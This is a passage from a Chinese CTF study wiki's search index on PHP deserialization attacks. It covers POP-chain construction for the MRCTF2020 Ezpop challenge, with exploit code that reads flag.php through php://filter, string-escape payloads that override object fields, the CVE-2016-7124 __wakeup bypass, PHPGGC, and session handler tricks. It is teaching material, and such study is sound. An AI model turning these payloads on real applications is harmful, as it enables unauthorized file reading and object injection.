<p>\u6240\u5199\u7684\u5185\u5bb9\u9700\u8981\u6709\u5bf9\u8c61\u4e2d\u7684\u6210\u5458\u53d8\u91cf\u7684\u503c</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#_3","title":"\u5e8f\u5217\u5316\u4e2d\u7c7b\u7684\u7c7b\u578b","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u5c11\u89c1\u7684\u3002</p> <p>\u5173\u4e8e\u5e8f\u5217\u5316\u4e2d\u7c7b\u7684\u7c7b\u578b\uff1aPUBLIC,PRIVATE,PROTECTED</p> <p>\u5176\u4e2d\u5728\u63d0\u4ea4\u6570\u636e\u7684\u65f6\u5019\uff1a</p> <p>public\u4e0d\u9700\u8981\u8fdb\u884c\u8fc7\u591a\u4fee\u9970</p> <p>private\u9700\u8981%00Name%00</p> <p>protected\u5219\u662f\u9700\u8981\uff1a %00*%00username\u7684\u5f62\u5f0f</p> <p>\u4e5f\u5c31\u662f\u8bf4</p> <pre><code>O:4:\"Name\":2\uff1a{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;}\n</code></pre> <p>\u5982\u679c\u662fprivate\u7c7b\u578b\u7684\u8bdd\u5e94\u8be5\u5199\u6210</p> <pre><code>O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n</code></pre> <p>\u4e00\u822c\u6765\u8bf4\u6211\u4f1a\u5148\u5b9a\u4e49\u6210public\u7136\u540e\u624b\u52a8\u6dfb\u52a0\u3002</p> <p>\u4f8b\u9898\uff1a</p> <p>[\u6781\u5ba2\u5927\u6311\u6218 2019]PHP</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#pop","title":"POP\u94fe","text":"<p>\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u6765\u8bf4\uff0c\u8fd9\u4e0d\u662f\u4e00\u79cd\u6280\u672f\uff0c\u800c\u662f\u4e00\u79cd\u601d\u7ef4\u3002</p> <p>\u6240\u4ee5\u8bf4\u4e0d\u592a\u597d\u4ece\u7406\u8bba\u4e0a\u6765\u89e3\u91ca\u3002</p> <p>\u7ed9\u4e2a\u4f8b\u9898\uff1a</p> <p>[MRCTF2020]Ezpop</p> <p>\u4e0b\u9762\u662f\u5feb\u4e50\u7684\u4ee3\u7801\u5ba1\u8ba1\u73af\u8282</p> <pre><code>Welcome to index.php\n&lt;?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\nprotected  $var;\npublic function append($value){\ninclude($value);\n}\npublic function __invoke(){\n$this-&gt;append($this-&gt;var);\n}\n}\nclass Show{\npublic $source;\npublic $str;\npublic function __construct($file='index.php'){\n$this-&gt;source = $file;\necho 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\";\n}\npublic function __toString(){\nreturn $this-&gt;str-&gt;source;\n}\npublic function __wakeup(){\nif(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {\necho \"hacker\";\n$this-&gt;source = \"index.php\";\n}\n}\n}\nclass Test{\npublic $p;\npublic function __construct(){\n$this-&gt;p = array();\n}\npublic function __get($key){\n$function = $this-&gt;p;\nreturn $function();\n}\n}\nif(isset($_GET['pop'])){\n@unserialize($_GET['pop']);\n}\nelse{\n$a=new Show;\nhighlight_file(__FILE__);\n}\n</code></pre> <p>\u5ba1\u8ba1\u5b8c\u4ee3\u7801\u5e94\u8be5\u662finclude\u7684\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6765\u8bfb\u53d6\u6211\u4eec\u7684flag\uff0c\u4f46\u73b0\u5728\u7684\u95ee\u9898\u662f\u6240\u9700\u8981\u4f7f\u7528\u7684\u7c7b\u4e3aModifier,\u6211\u4eec\u6240\u80fd\u63a7\u5236\u7684\u53ea\u662f\u4e00\u4e2a\u7b80\u7b80\u5355\u5355\u7684pop\uff0c\u90a3\u4e48\u8be5\u600e\u6837\u624d\u80fd\u8fdb\u5165\u8fd9\u4e2a\u7c7b\u4e4b\u4e2d\uff1f</p> <p>\u4e0b\u9762\u662f\u4e2a\u4eba\u7684\u7406\u89e3\u3002</p> <p>\u9996\u5148\u8c03\u7528unserialize()\u51fd\u6570\u7684\u65f6\u5019\u89e6\u53d1\u7c7b\u4e2d\u7684__wakeup()\uff0cWakeup()\u8c03\u7528\u4e86\u5b57\u7b26\u5339\u914d\u8fc7\u6ee4\uff0c\u5c06\u7c7b\u8f6c\u5316\u4e3a\u5b57\u7b26\u4e32\u8c03\u7528\uff0c\u5219\u53c8\u4f1a\u81ea\u52a8\u8c03\u7528__tostring(),\u5982\u679c\u5c06\u5176\u5b9e\u4f8b\u5316\u4e3aTEST\uff0c\u5219\u4f1a\u8fd4\u56deTEST\u4e2d\u7684source\u5c5e\u6027\uff0c\u4f46\u662fTEST\u4e2d\u4e0d\u542b\u6709source \uff0c\u90a3\u4e48\u5c31\u4f1a\u89e6\u53d1\u5728\u5f53\u524d\u7c7b\u4e0d\u5305\u542b\u5c5e\u6027\u4e2d\u81ea\u52a8\u8c03\u7528\u7684__get(),\u5c06\u5176\u5b9e\u4f8b\u5316\u4e3aModifier\u7c7b\uff0c\u89e6\u53d1__invoke()\u65b9\u6cd5\uff0c\u6700\u7ec8\u5229\u7528include\u6587\u4ef6\u5305\u542b\u8bfb\u53d6\u5230flag.php\u3002</p> <p>\u8fd9\u5c31\u662fpop\u94fe</p> <p>\u4e5f\u5c31\u662funserilize-&gt;__wakeup-&gt;__tostring-&gt;__get-&gt;__invoke-&gt;include\u6587\u4ef6\u5305\u542b</p> <p>\u81f3\u4e8e\u4ee3\u7801\u7684\u5199\u6cd5\uff1a</p> <pre><code>&lt;?php\nclass Modifier {\nprotected  $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";\n}\nclass Test{\npublic $p;\n}\nclass Show{\npublic $source;\npublic $str;\npublic function __construct(){\n$this-&gt;str = new Test();\n}\n}\n$a = new Show();//\u6b64\u65f6source(show)-&gt;str\n$a-&gt;source = new Show();//source(show)-&gt;str\u4e4b\u540e\u89e6\u53d1__tostring\u7136\u540e\u8bbf\u95eesource(test)\u89e6\u53d1__get\n$a-&gt;source-&gt;str-&gt;p = new Modifier();//__get\u8fd4\u56de\u7684p\u89e6\u53d1__invoke\necho serialize($a);\n?&gt;\n</code></pre> <p>\u6700\u540e\u7ed3\u679c\u56e0\u4e3a\u662fprivate\u6240\u4ee5\u9700\u8981%00\u6765\u586b\u5145\u3002</p> <p>\u5982\u679c\u770b\u4e0d\u61c2\u7684\u8bdd\u53ef\u4ee5\u5c1d\u8bd5\u624b\u7ed8\u4e00\u4e0b\u7c7b\u6307\u5411\u7684\u7ed3\u6784\uff0c\u5e94\u8be5\u662f\u6ca1\u4ec0\u4e48\u5927\u95ee\u9898\u3002</p> <p>\u6700\u540e\uff0c\u8fd9\u5e94\u8be5\u662f\u78b0\u5230\u7684php\u53cd\u5e8f\u5217\u5316\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u627epop\u94fe\u53ef\u4ee5\u8bf4\u662f\u8fd9\u7c7b\u9898\u76ee\u91cc\u9762\u6700\u6709\u610f\u601d\u7684\u4e1c\u897f\u4e86\u3002</p> <p>\u5982\u679c\u60f3\u6311\u6218\u7684\u5316\u53ef\u4ee5\u5eb7\u5eb7\u3002</p> <p>[CISCN2019 \u603b\u51b3\u8d5b Day1 Web4]Laravel1</p> <p>\u8fd9\u79cd\u5927\u6846\u67b6\u4e0b\u7684\u6f0f\u6d1e\u4e00\u822c\u90fd\u662f\u5728\u7f51\u4e0a\u80fd\u627e\u5f97\u5230\u6e90\u7801\u6216\u8005\u76f4\u63a5\u662f\u6f0f\u6d1e\u3002\u8fd9\u79cd\u5c31\u529f\u5229\u4e00\u70b9\uff0c\u56e0\u4e3a\u522b\u4eba\u6316\u4e86\u5f88\u4e45\u624d\u627e\u5230\u7684\u6f0f\u6d1e\u51e0\u4e2a\u5c0f\u65f6\u89e3\u51b3\u662f\u4e0d\u5927\u73b0\u5b9e......\u7ecf\u5e38\u4f1a\u78b0\u5230\u7684\u8fd8\u6709THINKPHP5\u7cfb\u7684\u6f0f\u6d1e\u3002 \u4e00\u9053\u975e\u5e38\u957f\u957f\u957f\u7684\u53cd\u5e8f\u5217\u5316\u9898\u76ee\uff0c\u4f46\u662f\u4e5f\u5e76\u4e0d\u662f\u5b8c\u5168\u6ca1\u6709\u601d\u8def\uff0c</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#_4","title":"\u5b57\u7b26\u9003\u9038","text":""},{"location":"web_bak/serialize/PHP/php_serialize/#_5","title":"\u5b57\u7b26\u589e\u52a0\u578b","text":"<p>\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u4ee5<code>\";}</code>\u7ed3\u675f\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u628a<code>\";}</code>\u5e26\u5165\u9700\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5b57\u7b26\u4e32\uff08\u9664\u4e86\u7ed3\u5c3e\u5904\uff09\uff0c\u5c31\u80fd\u8ba9\u53cd\u5e8f\u5217\u5316\u63d0\u524d\u95ed\u5408\u7ed3\u675f\uff0c\u540e\u9762\u7684\u5185\u5bb9\u5c31\u4e22\u5f03\u4e86\u3002</p> <p>\u8bf4\u8d77\u6765\u6709\u70b9\u96be</p> <pre><code>&lt;?php\nfunction filter($str){\n    return str_replace('bb', 'ccc', $str);\n}\nclass A{\n    public $name='aaaa';\n    public $pass='123456';\n}\n$AA=new A();\necho serialize($AA).\"\\n\";\n$res=filter(serialize($AA));\n$c=unserialize($res);\necho $c-&gt;pass;\n?&gt;\nPHP\n</code></pre> <p>\u4ee3\u7801\u7684\u903b\u8f91\u662f\u5e8f\u5217\u5316\uff0c\u7136\u540e\u5c06bb\u66ff\u6362\u4e3accc\u3002</p> <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\u5982\u679c\u6211\u4eec\u4f20\u5165\uff1a$name=aaaabb,\u8fd9\u6837\u4e00\u5b9a\u4f1a\u662f\u62a5\u9519\u7684\uff1a</p> <p></p> <p>php\u662f\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b83\u89e3\u6790\u4e0d\u4e86\uff1aO:1:\"A\":2:{s:4:\"name\";s:6:\"aaaaccc\";s:4:\"pass\";s:6:\"123456\";}</p> <p>s\u540e\u9762\u7684aaaacc+c\u6700\u540e\u7684c\u662f\u6ca1\u529e\u6cd5\u89e3\u6790\u7684\u3002</p> <p>\u6839\u636ephp\u89e3\u6790\u5e8f\u5217\u5316\u5b57\u7b26\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u6211\u4eec\u5411name\u4e2d\u4f20\u8f93\u6570\u636e\u4e3a\";s:4:\"pass\";s:6:\"hacker\";}\u3002</p> <p>name\u88ab\u5e8f\u5217\u5316\u540e\u7684\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u540ename\u4ecd\u7136\u4e3a\";s:4:\"pass\";s:6:\"hacker\";}</p> <p></p> <p>O:1:\"A\":2:{s:4:\"name\";s:27:\"\";s:4:\"pass\";s:6:\"hacker\";}\";s:4:\"pass\";s:6:\"123456\";}</p> <p>\u53ef\u89c1\u5728\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32\u5728\u7ecf\u8fc7filter\u51fd\u6570\u8fc7\u6ee4\u524d\uff0cs\u4e3a6\uff0c\u5185\u5bb9\u4e3aaaaabb\uff1b\u7ecf\u8fc7filter\u8fc7\u6ee4\u540e\uff0cs\u4ecd\u7136\u4e3a6\uff0c\u4f46\u5185\u5bb9\u53d8\u4e3a\u4e86aaaaccc\uff0c\u957f\u5ea6\u53d8\u6210\u4e867\uff0c\u6839\u636e\u53cd\u5e8f\u5217\u5316\u8bfb\u53d6\u53d8\u91cf\u7684\u539f\u5219\u6765\u8bb2\uff0c\u6b64\u65f6\u7684name\u80fd\u8bfb\u53d6\u5230\u7684\u53ea\u662faaaacc\uff0c\u672b\u5c3e\u5904\u7684\u90a3\u4e2ac\u662f\u8bfb\u53d6\u4e0d\u5230\u7684\uff0c\u8fd9\u5c31\u5f62\u6210\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u9003\u9038\u3002\u5f53\u6211\u4eec\u6dfb\u52a0\u591a\u4e2abb\uff0c\u6bcf\u6dfb\u52a0\u4e00\u4e2abb\u6211\u4eec\u5c31\u80fd\u9003\u9038\u4e00\u4e2a\u5b57\u7b26\uff0c\u90a3\u6211\u4eec\u5c06\u9003\u9038\u7684\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u586b\u5145\u6210\u6211\u4eec\u8981\u53cd\u5e8f\u5217\u5316\u7684\u4ee3\u7801\u957f\u5ea6\u7684\u8bdd\u90a3\u5c31\u53ef\u4ee5\u63a7\u5236\u53cd\u5e8f\u5217\u5316\u7684\u7ed3\u679c\u4ee5\u53ca\u7c7b\u91cc\u9762\u7684\u53d8\u91cf\u503c\u4e86\u3002</p> <p>\u8fd9\u91cc\u6709\u4e2a27\uff0c\u6240\u4ee5\u6211\u4eec\u6dfb\u52a027\u4e2abb,\u76f8\u5f53\u4e8e\u66ff\u6362ccc\u540e\u5c31\u80fd\u591f\u9003\u9038\u6389\u8fd9\u4e2a27\uff0c\u7136\u540e\u7531\u6211\u4eec\u8f93\u5165\u7684\uff1b}\u95ed\u5408\u6389\u53cd\u5e8f\u5217\u5316\uff0c\u5ffd\u7565\u6389\u539f\u6765\u7684\u6570\u636e\u3002\u5b8c\u6210\u5b57\u7b26\u9003\u9038\u3002</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#_6","title":"\u5b57\u7b26\u51cf\u5c11\u578b","text":"<p>\u5f88\u7c7b\u4f3c\uff0c\u5982\u679c\u4e0a\u9762\u7684\u80fd\u591f\u770b\u61c2\u7684\u8bdd\uff0c\u4e0b\u9762\u7684\u81ea\u5df1\u5e94\u8be5\u4e5f\u5c31\u80fd\u5199\u51fa\u6765\u3002</p> <pre><code>&lt;?phpfunction str_rep($string){ return preg_replace( '/php|test/','', $string);}\n$test['name'] = $_GET['name'];$test['sign'] = $_GET['sign']; $test['number'] = '2020';$temp = str_rep(serialize($test));printf($temp);$fake = unserialize($temp);echo '&lt;br&gt;';print(\"name:\".$fake['name'].'&lt;br&gt;');print(\"sign:\".$fake['sign'].'&lt;br&gt;');print(\"number:\".$fake['number'].'&lt;br&gt;');?&gt;\nPHP\n</code></pre> <p>\u5e8f\u5217\u5316-&gt;\u66ff\u6362-&gt;\u53cd\u5e8f\u5217\u5316</p> <p>\u6211\u4eec\u8981\u4fee\u6539number\u7684\u503c\uff0c\u5c31\u8981\u5728sign\u4e2d\u52a0\u5165<code>\";s:6:\"number\";s:4:\"2020\";}</code></p> <p></p> <p>\u53ef\u4ee5\u81ea\u5df1\u6765\u5c1d\u8bd5\u3002\u770b\u4e0d\u61c2\u81ea\u5df1var_dump</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#cve-2016-7124","title":"CVE-2016-7124","text":"<p>\u5f53\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\u8868\u793a\u5bf9\u8c61\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u7684\u5c5e\u6027\u4e2a\u6570\u65f6\u4f1a\u8df3\u8fc7__wakeup\u7684\u6267\u884c</p> <pre><code>O:4:\"test\":1:{s:4:\"name\";s:5:\"fairy\";}//\u8fd9\u4e00\u4e32\nPHP\n</code></pre> <p>\u5982\u679c\u6539\u6210                    |</p> <pre><code>O:4:\"test\":2:{s:4:\"name\";s:5:\"fairy\";}\n</code></pre> <p>\u5c31\u4f1a\u8df3\u8fc7__wakeup()\u9b54\u672f\u65b9\u6cd5\u3002\uff08\u4f8b\u5b50\u5c31\u4e0d\u653e\u4e86\uff09</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#phpggc","title":"PHPGGC\u53cd\u5e8f\u5217\u5316\u5de5\u5177","text":"<p>\u8fd9\u4e2a\u5de5\u5177\u662f\u6700\u8fd1\u624d\u53d1\u73b0\u7684\uff0c\u5148\u7b49\u6211\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\u56de\u987e\u4e00\u4e0b\u518d\u5206\u4eab\u7ed9\u5927\u5bb6\u3002\u53ef\u4ee5\u8fd0\u7528\u5728\u76ee\u524d\u6bd4\u8f83\u4e3b\u6d41\uff08\u800c\u53c8\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff09\u7684\u6846\u67b6\u4e2d\uff0c\u6bd4\u5982\u8bf4thinkphp(\u611f\u89c9\u90fd\u662f\u8001\u6bdb\u75c5\u4e86),laravel......</p> <p>\u7136\u540e\u7528\u547d\u540d\u7a7a\u95f4\u5199\u7684\u53cd\u5e8f\u5217\u5316\u672c\u4eba\u4e5f\u8fd8\u662f\u4e0d\u592a\u4f1a\u3002</p> <p>\u4ece0\u52301\u638c\u63e1\u53cd\u5e8f\u5217\u5316\u5de5\u5177\u4e4bPHPGGC - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/5450</p>"},{"location":"web_bak/serialize/PHP/php_serialize/#phpggc_1","title":"PHPGGC\u53cd\u5e8f\u5217\u5316\u5de5\u5177","text":"<p>\u8fd9\u4e2a\u5de5\u5177\u662f\u6700\u8fd1\u624d\u53d1\u73b0\u7684\uff0c\u5148\u7b49\u6211\u4f7f\u7528\u4e00\u6bb5\u65f6\u95f4\u56de\u987e\u4e00\u4e0b\u518d\u5206\u4eab\u7ed9\u5927\u5bb6\u3002\u53ef\u4ee5\u8fd0\u7528\u5728\u76ee\u524d\u6bd4\u8f83\u4e3b\u6d41\uff08\u800c\u53c8\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff09\u7684\u6846\u67b6\u4e2d\uff0c\u6bd4\u5982\u8bf4thinkphp(\u611f\u89c9\u90fd\u662f\u8001\u6bdb\u75c5\u4e86),laravel......</p> <p>\u7136\u540e\u7528\u547d\u540d\u7a7a\u95f4\u5199\u7684\u53cd\u5e8f\u5217\u5316\u672c\u4eba\u4e5f\u8fd8\u662f\u4e0d\u592a\u4f1a\u3002</p> <p>\u4ece0\u52301\u638c\u63e1\u53cd\u5e8f\u5217\u5316\u5de5\u5177\u4e4bPHPGGC - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/5450</p> <p>\u653e\u4e0a\u6765\u4e86\uff0c\u81ea\u5df1\u8bd5\u8bd5\u7684\u8bdd\u53ef\u4ee5[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u548c\u8bb0\u5f97XCTF\u4e0a\u9762\u7684\u4e00\u4e2athinkphp5\u7684\u9898\u76ee</p> <p>https://github.com/wh1t3p1g/phpggc</p> <p>\u4f5c\u8005\u7684\u4ecb\u7ecd\u3002</p> <p>\u7136\u540e\u8fd9\u662f\u672c\u4eba\u5c1d\u8bd5\u7684\u5b9e\u73b0</p> <p>[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u62ff\u5230\u9898\u76ee\u672c\u80fd\u7684\u626b\u63cf\u4e00\u4e0b\u540e\u53f0\u53d1\u73b0\u4e86\u8fd9\u662f\u4e00\u4e2athinkphp6.x\u7684\u6846\u67b6\uff08\u6e90\u7801\u5b9e\u5728\u662f\u592a\u957f\u4e86\uff01\uff09 \u6240\u4ee5\u5f88\u5927\u6982\u7387\u662f\u548cciscn\u90a3\u9053laravel\u4e00\u6837\uff0c\u4f1a\u6709\u6bd4\u8f83\u957f\u7684\u5206\u6790\u94fe \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e00\u4e0b\u5de5\u5177phpggc chmod +x phpggc ./phpg</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p> <p>\u653e\u4e0a\u6765\u4e86\uff0c\u81ea\u5df1\u8bd5\u8bd5\u7684\u8bdd\u53ef\u4ee5[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u548c\u8bb0\u5f97XCTF\u4e0a\u9762\u7684\u4e00\u4e2athinkphp5\u7684\u9898\u76ee</p> <p>https://github.com/wh1t3p1g/phpggc</p> <p>\u4f5c\u8005\u7684\u4ecb\u7ecd\u3002</p> <p>\u7136\u540e\u8fd9\u662f\u672c\u4eba\u5c1d\u8bd5\u7684\u5b9e\u73b0</p> <p>[\u5b89\u6d35\u676f 2019]iamthinking</p> <p>\u62ff\u5230\u9898\u76ee\u672c\u80fd\u7684\u626b\u63cf\u4e00\u4e0b\u540e\u53f0\u53d1\u73b0\u4e86\u8fd9\u662f\u4e00\u4e2athinkphp6.x\u7684\u6846\u67b6\uff08\u6e90\u7801\u5b9e\u5728\u662f\u592a\u957f\u4e86\uff01\uff09 \u6240\u4ee5\u5f88\u5927\u6982\u7387\u662f\u548cciscn\u90a3\u9053laravel\u4e00\u6837\uff0c\u4f1a\u6709\u6bd4\u8f83\u957f\u7684\u5206\u6790\u94fe \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u4e00\u4e0b\u5de5\u5177phpggc chmod +x phpggc ./phpg</p> <p>\u6570\u636e\u5b89\u5168\u7814\u7a76\u9662-WIKI</p>"},{"location":"web_bak/serialize/PHP/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B7%B3%E6%9D%BF/","title":"session\u53cd\u5e8f\u5217\u5316\u8df3\u677f","text":"<p>\u548c\u6587\u4ef6\u5305\u542b</p> <p>\u5728php.ini\u6709\u4ee5\u4e0b\u51e0\u4e2a\u9ed8\u8ba4\u9009\u9879</p> <pre><code>1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = \"upload_progress_\"4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"5. session.upload_progress.freq = \"1%\"6. session.upload_progress.min_freq = \"1\"\n</code></pre> <pre><code>enabled=on\u8868\u793aupload_progress\u529f\u80fd\u5f00\u59cb\uff0c\u4e5f\u610f\u5473\u7740\u5f53\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0cphp\u5c06\u4f1a\u628a\u6b64\u6b21\u6587\u4ef6\u4e0a\u4f20\u7684\u8be6\u7ec6\u4fe1\u606f(\u5982\u4e0a\u4f20\u65f6\u95f4\u3001\u4e0a\u4f20\u8fdb\u5ea6\u7b49)\u5b58\u50a8\u5728session\u5f53\u4e2d \uff1bcleanup=on\u8868\u793a\u5f53\u6587\u4ef6\u4e0a\u4f20\u7ed3\u675f\u540e\uff0cphp\u5c06\u4f1a\u7acb\u5373\u6e05\u7a7a\u5bf9\u5e94session\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u9009\u9879\u975e\u5e38\u91cd\u8981\uff1bname\u5f53\u5b83\u51fa\u73b0\u5728\u8868\u5355\u4e2d\uff0cphp\u5c06\u4f1a\u62a5\u544a\u4e0a\u4f20\u8fdb\u5ea6\uff0c\u6700\u5927\u7684\u597d\u5904\u662f\uff0c\u5b83\u7684\u503c\u53ef\u63a7\uff1bprefix+name\u5c06\u8868\u793a\u4e3asession\u4e2d\u7684\u952e\u540d.session.use_strict_mode=off\u8fd9\u4e2a\u9009\u9879\u9ed8\u8ba4\u503c\u4e3aoff\uff0c\u8868\u793a\u6211\u4eec\u5bf9Cookie\u4e2dsessionid\u53ef\u63a7\u3002\n</code></pre> <pre><code>session.save_path=\"D:\\xampp\\tmp\"    \u8868\u660e\u6240\u6709\u7684session\u6587\u4ef6\u90fd\u662f\u5b58\u50a8\u5728xampp/tmp\u4e0bsession.save_handler=files         \u8868\u660esession\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u5b58\u50a8\u7684session.auto_start=0              \u8868\u660e\u9ed8\u8ba4\u4e0d\u542f\u52a8sessionsession.serialize_handler=php     \u8868\u660esession\u7684\u9ed8\u8ba4\u5e8f\u5217\u8bdd\u5f15\u64ce\u4f7f\u7528\u7684\u662fphp\u5e8f\u5217\u8bdd\u5f15\u64ce\n</code></pre> <p>\u5728\u4e0a\u8ff0\u7684\u914d\u7f6e\u4e2d\uff0c<code>session.serialize_handler</code>\u662f\u7528\u6765\u8bbe\u7f6esession\u7684\u5e8f\u5217\u8bdd\u5f15\u64ce\u7684\uff0c\u9664\u4e86\u9ed8\u8ba4\u7684PHP\u5f15\u64ce\u4e4b\u5916\uff0c\u8fd8\u5b58\u5728\u5176\u4ed6\u5f15\u64ce\uff0c\u4e0d\u540c\u7684\u5f15\u64ce\u6240\u5bf9\u5e94\u7684session\u7684\u5b58\u50a8\u65b9\u5f0f\u4e0d\u76f8\u540c\u3002</p> <p>php_binary:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d\u7684\u957f\u5ea6\u5bf9\u5e94\u7684ASCII\u5b57\u7b26+\u952e\u540d+\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> <ul> <li> <p>php:\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u952e\u540d+\u7ad6\u7ebf+\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5904\u7406\u7684\u503c</p> </li> <li> <p>php_serialize(php&gt;5.5.4):\u5b58\u50a8\u65b9\u5f0f\u662f\uff0c\u7ecf\u8fc7serialize()\u51fd\u6570\u5e8f\u5217\u5316\u5904\u7406\u7684\u503c</p> </li> <li> <p>\u5728PHP\u4e2d\u9ed8\u8ba4\u4f7f\u7528\u7684\u662fPHP\u5f15\u64ce\uff0c\u5982\u679c\u8981\u4fee\u6539\u4e3a\u5176\u4ed6\u7684\u5f15\u64ce\uff0c\u53ea\u9700\u8981\u6dfb\u52a0\u4ee3\u7801<code>ini_set('session.serialize_handler', '\u9700\u8981\u8bbe\u7f6e\u7684\u5f15\u64ce');</code></p> </li> </ul> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something\n</code></pre> <p>php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u800c\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff0c\u5b58\u50a8\u65b9\u5f0f\u5c31\u662f\u7531\u914d\u7f6e\u9879<code>session.save_handler</code>\u6765\u8fdb\u884c\u786e\u5b9a\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8\u3002</p> <p>\u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5<code>sess_sessionid</code>\u6765\u8fdb\u884c\u547d\u540d\u7684\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u662fsession\u503c\u7684\u5e8f\u5217\u8bdd\u4e4b\u540e\u7684\u5185\u5bb9\u3002</p> <p>\u5047\u8bbe\u6211\u4eec\u7684\u73af\u5883\u662fxampp\uff0c\u90a3\u4e48\u9ed8\u8ba4\u914d\u7f6e\u5982\u4e0a\u6240\u8ff0\u3002</p> <p>\u5728\u9ed8\u8ba4\u914d\u7f6e\u60c5\u51b5\u4e0b\uff1a</p> <pre><code>&lt;?phpsession_start()$_SESSION['name'] = 'spoock';var_dump();?&gt;\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230PHPSESSID\u7684\u503c\u662f<code>jo86ud4jfvu81mbg28sl2s56c2</code>\uff0c\u800c\u5728<code>xampp/tmp</code>\u4e0b\u5b58\u50a8\u7684\u6587\u4ef6\u540d\u662f<code>sess_jo86ud4jfvu81mbg28sl2s56c2</code>\uff0c\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>name|s:6:\"spoock\";</code>\u3002name\u662f\u952e\u503c\uff0c<code>s:6:\"spoock\";</code>\u662f<code>serialize(\"spoock\")</code>\u7684\u7ed3\u679c\u3002</p> <p>\u5728php_serialize\u5f15\u64ce\u4e0b\uff1a</p> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();$_SESSION['name'] = 'spoock';var_dump();?&gt;\n</code></pre> <p>SESSION\u6587\u4ef6\u7684\u5185\u5bb9\u662f<code>a:1:{s:4:\"name\";s:6:\"spoock\";}</code>\u3002<code>a:1</code>\u662f\u4f7f\u7528php_serialize\u8fdb\u884c\u5e8f\u5217\u8bdd\u90fd\u4f1a\u52a0\u4e0a\u3002\u540c\u65f6\u4f7f\u7528php_serialize\u4f1a\u5c06session\u4e2d\u7684key\u548cvalue\u90fd\u4f1a\u8fdb\u884c\u5e8f\u5217\u5316\u3002</p> <p>\u5728php_binary\u5f15\u64ce\u4e0b\uff1a</p> <pre><code>&lt;?phpini_set('session.serialize_handler', 'php_binary');session_start();$_SESSION['name'] = 'spoock';var_dump();?&gt;\n</code></pre> 